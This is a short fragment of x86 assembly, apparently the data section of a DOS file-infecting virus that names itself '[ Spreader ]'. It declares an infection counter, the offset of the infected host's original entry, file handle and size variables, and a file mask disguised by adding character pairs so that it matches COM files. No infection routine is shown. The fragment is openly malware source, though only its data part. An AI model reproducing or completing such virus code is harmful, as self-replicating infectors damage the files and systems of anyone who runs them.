_savew          dw      ?               ; used when set int3 after block
_last           dw      ?               ; ofs after cmd/block
segbuf          dw      ?               ; seg for buffer
fsize           dw      ?               ; file size
handle          dw      ?               ; file handle
tab_index       dw      ?               ; current position in table
inf_q           db      ?               ; infections count
oentry          dw      ofs endvir      ; offset old begin of host
msk             dw      '.*'+'19'       ;
                dw      'oc'+'98'       ; file mask
                dw      'm'             ;
vname           db      '[ Spreader ]',0
